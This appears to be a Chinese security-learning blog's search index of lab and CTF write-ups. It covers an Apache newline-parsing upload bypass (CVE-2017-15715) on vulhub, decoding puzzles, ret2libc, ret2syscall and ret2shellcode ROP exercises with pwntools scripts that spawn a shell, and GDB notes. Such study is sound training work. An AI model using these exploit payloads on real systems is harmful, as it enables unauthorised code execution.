<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulhub:CVE-2017-15715</title>
    <link href="/2023/01/06/vulhub%EF%BC%9ACVE-2017-15715/"/>
    <url>/2023/01/06/vulhub%EF%BC%9ACVE-2017-15715/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Apache HTTPD换行解析漏洞。</p><p>Apache在2.4.0-2.4.29版本中存在一个解析漏洞，程序在解析php时，若文件名最后有一个换行符<code>x0A</code>,apache依然会将其当成php解析，但是在上传文件时可以成功绕过黑名单。</p><p>如果上传文件的php程序是设置的白名单，那么这个漏洞将无法利用。</p><h1 id="漏洞利用实操"><a href="#漏洞利用实操" class="headerlink" title="漏洞利用实操"></a>漏洞利用实操</h1><p>构造文件1.php</p><p>内容：</p><pre><code class="hljs">&lt;?php    phpinfo();?&gt;</code></pre><p>上传：</p><p><img src="https://s2.loli.net/2023/01/06/qDdvEzKGwoeUHh7.png" alt="image.png"></p><p>返回<code>bad file</code></p><p>打开bp抓包，把包发送到重发器</p><p>切换Hex，找到1.php</p><p><img src="https://s2.loli.net/2023/01/06/gnXfeHpDcdyjhR5.png" alt="image.png"></p><p>在70后添加个<code>0a</code>,然后点击发送，此时回显已经没有<code>bad file</code>了</p><p><img src="https://s2.loli.net/2023/01/06/bYJRr47gGAdh5pl.png" alt="image.png"></p><p>访问<code>http://ip:8080/1.php%0a</code></p><p>成功看到phpinfo信息，说明apache解析了<code>1.php%0a</code></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>apache配置文件中，将以<code>.php</code>结尾的文件都进行解析，但<code>$</code>符号会匹配换行符</p><p><img src="https://s2.loli.net/2023/01/06/xW9NL6Y5TjVna1E.png" alt="image.png"></p><p>即<code>.php</code>加上换行符就能被解析成php文件</p><blockquote><p>0x0a是换行符的ascii码，换行符是控制字符，所以修改数据包的十六进制来达到插入换行符的目的</p></blockquote><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>对中间件进行升级</li><li>对上传文件重命名</li><li>上传时采用白名单的验证方式</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>vulhub</tag>
      
      <tag>靶场</tag>
      
      <tag>换行解析漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界CTF-Misc2</title>
    <link href="/2023/01/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc2/"/>
    <url>/2023/01/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc2/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h1><p>题目：<code>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd</code></p><p>以为是十六进制转文本，失败</p><p>看一下组成：数字+字母a-f</p><p>转ascii乱码，应该偏移了，一般是偏移128</p><pre><code class="hljs">s = 'd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd'hex_new = ''for i in range(0,len(s),2):    hex_ = s[i:i+2]    d_ = int('0x'+ hex_, 16)    d_surplus = d_%128    temp = hex(d_surplus)[2:4]    hex_new+=tempprint(str(hex_new))</code></pre><p>结果转字符串得到flag:</p><pre><code class="hljs"> DDCTF{9af3c9d377b61d269b11337f330c935f}</code></pre><h1 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h1><p>密文：</p><pre><code class="hljs">4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</code></pre><p>rot13解密：</p><pre><code class="hljs">4B595954494D32515046324757595A534E52415653334357474E4A575955544E4B5A4D46434F4B59474253464D5A444E4D51334557524B5A4F424944473542554B595A44534B324E49565746515532464B49345649564B464E4E494543504A35</code></pre><p>base16解密：</p><pre><code class="hljs">KYYTIM2QPF2GWYZSNRAVS3CWGNJWYUTNKZMFCOKYGBSFMZDNMQ3EWRKZOBIDG5BUKYZDSK2NIVWFQU2FKI4VIVKFNNIECPJ5</code></pre><p>base32解密：</p><pre><code class="hljs">V143Pytkc2lAYlV3SlRmVXQ9X0dVdmd6KEYpP3t4V29+MElXSER9TUEkPA==</code></pre><p>base64解密：</p><pre><code class="hljs">W^7?+dsi@bUwJTfUt=_GUvgz(F)?{xWo~0IWHD}MA$&lt;</code></pre><p>看起来乱七八糟的，看wp，得知是base85解密：</p><p>没找到能解密的网站，找到了脚本解密一下：</p><pre><code class="hljs">import base64a = "W^7?+dsi@bUwJTfUt=_GUvgz(F)?{xWo~0IWHD}MA$&lt;"b = base64.b85decode(a)print(b)</code></pre><p>flag:</p><pre><code class="hljs">flag{W0w_y0u_c4n_rea11y_enc0d1ng!}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>攻防世界</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP之ret2libc</title>
    <link href="/2022/12/09/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2libc/"/>
    <url>/2022/12/09/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2libc/</url>
    
    <content type="html"><![CDATA[<p>程序下载：<a href="https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw">https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw </a><br>提取码：rc47</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2libc 即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。通常情况下，会选择执行<code>system('/bin/sh')</code>，所以需要先直到system函数的地址。</p><p>忘了plt啥是啥了，回忆一下：</p><h2 id="Got-Plt表"><a href="#Got-Plt表" class="headerlink" title="Got,Plt表"></a>Got,Plt表</h2><ul><li>got: 全局偏移表，用于存储外部函数在内存的确切地址，got表存储在数据段内，可以在程序运行中被修改。</li><li>plt: 程序链接表，用于存储外部函数的入口点，即程序总会到plt寻找外部函数的地址，plt存储在代码段内，在运行之前就已经确定并且不会被修改，所以plt不会知道程序运行时动态链接库被加载的确切位置。</li><li>plt表内存储的入口点就是got表中对应条目的地址</li><li>got表初始值都指向plt表对应条目中的某个片段，该片段的作用是调用一个函数地址解析函数，如果是第一次调用这个函数，程序会通过got表再次跳转回plt表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉got表初始值，之后再执行函数调用。当再次调用这个函数，程序仍然首先通过plt表跳转到got表，此时got表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数</li></ul><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>checksec查看：</p><p><img src="https://s2.loli.net/2022/12/09/6H4z2hNIy5mSOrQ.png" alt="image.png"></p><p>32位，got表可写，没开栈保护和地址随机，开启了NX(不可执行)</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA分析：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"RET2LIBC &gt;_&lt;"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>gets()函数，存在栈溢出漏洞。</p><p>查看字符串：</p><pre><code class="hljs">`/bin/sh`：0x08048720system: 0x08048460</code></pre><p>算偏移量，然后溢出到后门函数，就ok啦</p><p>看一下call gets()的地址：</p><p><img src="https://s2.loli.net/2022/12/09/6yR149KtDrTj8fx.png" alt="image.png"></p><p>gdb中下断点运行：</p><pre><code class="hljs">b *0x0804867E</code></pre><p><img src="https://s2.loli.net/2022/12/09/E4a2SyeiWoKLJcB.png" alt="image.png"></p><p>偏移量不对，看了一下wp</p><pre><code class="hljs">char s[100]; // [esp+1Ch] [ebp-64h] BYREF</code></pre><p>system在.plt段，调用plt中函数时需要在栈中部署两个参数，第一个是system执行后的返回地址，第二个是system函数中的参数。</p><p><img src="https://s2.loli.net/2022/12/12/mzOZa1Ipe7MLSXW.png" alt="image.png"></p><p>栈构造如图，s变量距离esp指针0x1Ch,距离ebp指针0x64h,所以偏移量为<code>ebp-(esp+1C)+4=112</code></p><p>还是不太理解，一般eax是存储返回地址的，所以偏移量就是<code>ebp-eax+4=112</code></p><p><img src="https://s2.loli.net/2022/12/12/7x6h2lSs5EoIvpr.png" alt="image.png"></p><p>我看pwndbg可以直接得到偏移量，但是这边网络不能访问Github,等回家吧。</p><p><img src="https://s2.loli.net/2022/12/12/kjANIc2O3qZJM7e.png" alt="image.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from&nbsp;pwn&nbsp;import&nbsp;*p&nbsp;=&nbsp;process("./ret2libc1")system_plt&nbsp;=&nbsp;0x08048460bin_sh&nbsp;=&nbsp;0x08048720payload&nbsp;=&nbsp;flat(['a'*112,system_plt,'b'*4,bin_sh])p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/12/p4sCBbRmZf6TcAQ.png" alt="image.png"></p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p><img src="https://s2.loli.net/2022/12/12/kJrzahF3b8gH4iU.png" alt="image.png"></p><p>32位，got表可写，开NX.</p><p>IDA分析：</p><p>main函数：</p><pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp){    char s[100]; // [esp+1Ch] [ebp-64h] BYREF    setvbuf(stdout, 0, 2, 0);    puts("Something surprise here, but I don't think it will work.");    printf("What do you think ?");    gets(s);    return 0;}</code></pre><p>有system</p><p>无<code>/bin/sh</code></p><p>需要自己来读取字符串，不会，看一看wp.</p><blockquote><p>思路：用geits输入system()的参数<code>/bin.sh</code></p></blockquote><p><img src="https://s2.loli.net/2022/12/12/l7aHPDZVyrvf148.png" alt="image.png"></p><pre><code class="hljs">gets_plt=0x08048460system_plt=0x08048490</code></pre><p>去bss段瞅瞅能用的变量：</p><p><img src="https://s2.loli.net/2022/12/12/IgaFqz2HrBwl1uh.png" alt="image.png"></p><p>看到了一个小可爱<code>buf2 (0x0804A080)</code></p><p>用gadget找ret语句：</p><pre><code class="hljs">ROPgadget --binary ret2libc2 --only 'pop|ret'</code></pre><p><img src="https://s2.loli.net/2022/12/12/7CTqJBtcA2Ov6aF.png" alt="image.png"></p><p>选择:</p><pre><code class="hljs">0x0804843d : pop ebx ; ret</code></pre><p>因为其他的只有<code>pop ebx</code>，没有<code>pop eax</code></p><p>算一下偏移吧，做到这里我甚至不知道自己干啥呢……没咋明白。</p><p>在gets()处断点：</p><pre><code class="hljs">b *0x080486BA</code></pre><p>运行：</p><p><img src="https://s2.loli.net/2022/12/12/9ptqKDe4fdr6bWi.png" alt="image.png"></p><pre><code class="hljs">EAX: 0xffffd49cEBP: 0xffffd508ESP: 0xffffd480</code></pre><p>跟ret2libc1一样，偏移就是112（用pwndbg爆出来也行<code>cyclic -l </code>）</p><p>栈结构一般是：</p><p><img src="https://s2.loli.net/2022/12/12/GHh9JYdNcVAWolx.png" alt="image.png"></p><p>本题栈结构：</p><p><img src="https://s2.loli.net/2022/12/12/n4vCXK6zgs2TGON.png" alt="image.png"></p><pre><code class="hljs">payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])</code></pre><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from pwn import *p=process('./ret2libc2')system_plt=0x08048490gets_plt=0x08048460buf2=0x0804A080payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/12/rU2kWYJIMHNz9Bw.png" alt="image.png"></p><p>成功！！！！</p><p>虽然不大明白，但是大概明白……</p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1>]]></content>
    
    
    
    <tags>
      
      <tag>ROP</tag>
      
      <tag>栈溢出</tag>
      
      <tag>CTFWikiPWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP之ret2syscall</title>
    <link href="/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/"/>
    <url>/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/</url>
    
    <content type="html"><![CDATA[<p>程序下载：<br><a href="https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw">https://pan.baidu.com/s/1gXkrC0w56yH-FdTkUjFttw </a><br>提取码：ch1e</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>原理：控制程序执行系统调用，获取shell</p><p><img src="https://s2.loli.net/2022/12/09/8CNOQ4Je79hujfr.png" alt="image.png"></p><p>checksec查看，32位，got表可写，没开栈保护和地址随机化，开了NX（不可执行）</p><p>IDA查看：</p><p>main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"This time, no system() and NO SHELLCODE!!!"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"What do you plan to do?"</span>);<br>  <span class="hljs-built_in">gets</span>(&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>gets()函数，栈溢出漏洞标志！</p><p>看见字符串有后门：<code>/bin/sh = 0x080be408</code></p><p>套路：先看变量v4的地址，然后再找ebp地址，计算出偏移量，然后垃圾数据覆盖溢出到后门函数那边。</p><p>本来我找了v4地址，看IDA是根据esp去索引的，想当然的就套公式，找esp找ebp算出偏移，但是错了，看了一下参考文章发现，linux系统调用跟eax有关：</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>linux的系统调用通过<code>int 80h</code>实现，用系统调用号来区分入口函数，操作系统实现系统调用的基本过程：</p><ul><li>应用程序调用库函数(API)：</li><li>API将系统调用号存入eax，通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数(系统调用)；</li><li>系统调用完成相应功能，将返回值存入eax，返回到中断处理函数；</li><li>中断处理函数返回到API中；</li><li>PI将eax返回给应用程序</li></ul><p>应用程序调用系统调用的过程：</p><ul><li>将系统调用的编号存入eax</li><li>将函数参数存入其他通用寄存器</li><li>最后<code>int 0x80</code></li></ul><p>寄存器执行顺序：</p><ul><li>32位：eax-&gt; ebx-&gt; ecx-&gt; edx</li><li>64位：rdi-&gt; rsi-&gt; rcx-&gt; r8-&gt; r9</li></ul><p>言归正传，所以此题的偏移量应为<code>ebp-eax</code></p><p><img src="https://s2.loli.net/2022/12/09/2ktGcJr9eInwBCS.png" alt="image.png"></p><pre><code class="hljs">EAX: 0xffffd4acEBP: 0xffffd518偏移量：0x6C + 4 = 112</code></pre><p>根据那个应用程序调用系统调用的顺序，也就是说我们将对应获取shell的系统调用参数，放到对应寄存器中，最后执行<code>int 0x80</code>就可以执行对应的系统调用了。</p><p>32位执行时，eax参数为系统调用号，ebx指向<code>/bin/sh</code>地址，ecx参数为0，edx参数也为0</p><p>即<code>execve('/bin/sh',NULL,NULL)</code></p><ul><li>execve() 函数是用来执行<code>/bin/sh</code>路径的</li></ul><p>参考文章：<a href="https://blog.csdn.net/qq742762377/article/details/84325369">https://blog.csdn.net/qq742762377/article/details/84325369</a></p><p>整理一下：</p><pre><code class="hljs">eax：0xbebx: /bin/shecx: 0edx: 0偏移：112</code></pre><p>控制寄存器的值可以使用gadgets,通常情况下无法保证程序中有一段连续的代码可以同时控制对应寄存器，因此需要一段一段的控制，gadgets最后使用ret来再次控制程序执行流程。</p><p>通过ropgedgets工具寻找gadgets.</p><p>ropgedgets的安装利用：<a href="https://www.wangan.com/docs/678">https://www.wangan.com/docs/678</a></p><p>找控制eax的gadgets:</p><pre><code class="hljs">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</code></pre><p><img src="https://s2.loli.net/2022/12/09/Ge6bnlydJzkWuC8.png" alt="image.png"></p><p>以上都能使用，我用第二行：</p><pre><code class="hljs">0x080bb196 : pop eax ; ret</code></pre><p>找控制ebx的gadgets:</p><pre><code class="hljs">ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'</code></pre><p><img src="https://s2.loli.net/2022/12/09/XU4NFbixWA79hHS.png" alt="image.png"></p><p>我用：</p><pre><code class="hljs">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></pre><p>能控制ebx,ecx,edx,都能控制，省事儿。</p><p>也可以用ropgadget找<code>/bin/sh</code>:</p><pre><code class="hljs">ROPgadget --binary rop  --string '/bin/sh'</code></pre><p>反正上面我IDA也找到了。</p><pre><code class="hljs">int 0x80的地址：ROPgadget --binary rop  --only 'int'</code></pre><p><img src="https://s2.loli.net/2022/12/09/Ju6MADH1cINFbmP.png" alt="image.png"></p><pre><code class="hljs">int 0x80: 0x08049421</code></pre><p>那么payload:</p><pre><code class="hljs">payload='a'*112+p32(pop_eax_addr)+p32(0xb)+p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p=process('./rop')pop_eax_addr=0x080bb196pop_edx_ecx_ebx_addr=0x0806eb90bin_addr=0x080be408int_addr=0x08049421payload='a'*112+p32(pop_eax_addr)+p32(0xb)+p32(pop_edx_ecx_ebx_addr)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/09/kmuOz9LMnvGpIF2.png" alt="image.png"></p><p>成功！！</p><p>看到有的exp里直接用一个flat()把p32()转换这直接简便了，我也贴一下吧：</p><pre><code class="hljs">payload&nbsp;=&nbsp;flat(["A"*112,pop_eax_addr,0xb,pop_edx_ecx_ebx_addr,0,0,bin_addr,int_addr])</code></pre><blockquote><p>注：如果程序中没有<code>/bin/sh</code>，就调用read()函数将<code>/bin/sh</code>写入bss段，然后再使用execve()</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>ROP</tag>
      
      <tag>栈溢出</tag>
      
      <tag>CTFWikiPWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP之ret2shellcode</title>
    <link href="/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/"/>
    <url>/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统的shell,一般来说shellcode需要自己填充。</p><p>控制程序执行shellcode。在栈溢出的基础上，若想在执行shellcode,需要对应的binary在运行时shellcode所在的区域具有可执行权限。</p><p>下载程序：</p><p><a href="https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ">https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ </a><br>提取码：r94f</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>checksec查看保护：</p><p><img src="https://s2.loli.net/2022/12/08/vDUj3E2pV7l6QAJ.png" alt="image.png"></p><p>32位，啥都没开。含有RWX段（可读可写可执行）</p><p>IDA看一下：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">int __cdecl <span class="hljs-selector-tag">main</span>(int argc, const char **argv, const char **envp)<br>{<br>  char s<span class="hljs-selector-attr">[100]</span>; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>("No system for you this time !!!");<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0</span>x64u);<br>  <span class="hljs-built_in">printf</span>("bye bye ~");<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>存在strncpy函数，栈溢出漏洞，将对应字符串s复制到buf2处。buf2在bss段：</p><p><img src="https://s2.loli.net/2022/12/08/gMj8EZsni9acCJu.png" alt="image.png"></p><p>buf2地址：<code>0x0804A080</code></p><p>查看call调用位置：</p><p><img src="https://s2.loli.net/2022/12/08/ekNcTuOyb2lp1x4.png" alt="image.png"></p><p>gdb在此处断点：</p><pre><code class="hljs">b *0x080485AF</code></pre><p><img src="https://s2.loli.net/2022/12/08/ISxJMn6FzAqTdLD.png" alt="image.png"></p><p>字符串地址：<code>0xffffd48c</code></p><p>ebp地址：<code>0xffffd4f8</code></p><pre><code class="hljs">0xffffd4f8 - 0xffffd48c = 0x6C</code></pre><p>偏移量：<code>0x6c+4</code></p><p>程序将s复制到buf2处，且buf2在bss段，在main处断点调试程序，运行之后利用vmmap查看。</p><ul><li>vmmap 用于查看程序各种段的地址和范围</li></ul><p><img src="https://s2.loli.net/2022/12/08/4GmfaT2AFNRLcSw.png" alt="image.png"></p><p>发现可执行bss段：</p><pre><code class="hljs">0x0804a000 0x0804b000 rwxp…/pwn_soft/ret2shellcode</code></pre><p>我们可以控制程序执行bss段处的shellcode</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>gets函数将获得内容复制给buf2数组，buf2未在main内定义，是未初始化的全局变量，且在.bss段，可以通过shellcraft.sh()函数，创造一个shell，将其写入buf2，通过栈溢出，将函数的返回地址覆盖为shell地址，即可获取shell。</p><ul><li><code>asm(shellcraft.sh())</code>  产生一个32位shell</li><li><code>asm(shellcraft.amd64.sh())</code> 产生一个64位shel</li><li><code>context(os=’linux’, arch=’amd64’, log_level=’debug’)</code><ul><li>os设置系统为linux系统,大多数pwn题目的系统都是linux</li><li>arch设置为amd64，可以简单的认为设置为64位的模式，对应的32位模式是i386</li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，将完整的io过程打印下来，方便调试.</li></ul></li></ul><p>信息：</p><pre><code class="hljs">buf2_addr = 0x0804A080偏移量：0x6c + 4 = 112</code></pre><p>exp:</p><pre><code class="hljs">from pwn import *p=process('./ret2shellcode')shell=asm(shellcraft.sh())buf2_addr=0x0804A080payload=shell.ljust(112,b'A')+p32(buf2_addr)p.sendline(payload)p.interactive()</code></pre><ul><li><code>shell.ljust(112,b'A')</code> 表示从机器码后方添加是数据直到总长112字节</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>ROP</tag>
      
      <tag>栈溢出</tag>
      
      <tag>CTFWikiPWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB利用技巧</title>
    <link href="/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h1><p>在源文件函数入口处断点：</p><pre><code class="hljs">b 文件名:函数名b text.c:func1</code></pre><p>在源文件某一行断点：</p><pre><code class="hljs">b 代码行号例：b 7</code></pre><p>在程序的某个地址断点：</p><pre><code class="hljs">b *address例：b 0x401000</code></pre><p>条件断点：</p><pre><code class="hljs">b num if cond例：b 14 if c=4</code></pre><p>查看断点：</p><pre><code class="hljs">info b</code></pre><p>删除断点：</p><pre><code class="hljs">del num[断点序号]</code></pre><p>设置断点有效和无效：</p><pre><code class="hljs">dis num # 将第num个断点设置为无效ena num # 将第num个断点设置为有效</code></pre><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><pre><code class="hljs">查看代码：l # 显示十行代码l 15 # 显示十五行代码l main # 显示main函数info source # 查看当前程序info r # 查看所有寄存器值info r 寄存器名 # c查看某一寄存器值</code></pre><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>程序从main函数开始：</p><pre><code class="hljs">run</code></pre><p>运行到第一个断点处：</p><pre><code class="hljs">start</code></pre><h1 id="执行流控制"><a href="#执行流控制" class="headerlink" title="执行流控制"></a>执行流控制</h1><pre><code class="hljs">c/continue # 向下运行到下一个断点处n/next # 单步步过，执行下一行代码，不进入调用的函数，直接返回结果s/step # 单步步入finish # 跳出函数体until # 跳出当前循环，在执行完循环体内最后一句之后执行until，才可以跳出循环j/jump # 跳转到指定行/地址后继续执行，若无断点则继续执行stop # 停止运行quit # 退出gdb</code></pre><h1 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h1><pre><code class="hljs">p var # 打印变量值ptype var # 打印变量类型p &amp;var # 打印变量地址p *addr # 打印地址的值p /x var # 用十六禁止显示数据info args # 打印到当前函数参数值info locals # 打印当前函数中所有局部变量值</code></pre><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><ul><li>vmmap 用于查看程序各种段的地址和范围</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>GDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP之ret2text</title>
    <link href="/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/"/>
    <url>/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/</url>
    
    <content type="html"><![CDATA[<p>访问不了github，改了host,也试过改DNS都不行，抓狂浪费时间，最后果断选择翻一下下载了这个程序。</p><p>自行下载：</p><p><a href="https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw">https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw</a></p><p>提取码：v4gi</p><p>跟着CTFWikiPWN一起做一遍：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3" title="CTFWikiPWN">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>reet2text即控制程序本身已有的代码(.text)</p><p><img src="https://s2.loli.net/2022/12/07/GPTQWzslnur8YcU.png" alt="image.png"></p><p>32位，got表可写，没开栈保护和地址随机，开了NX(栈不可以执行保护),可以考虑rop绕过。</p><p>main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 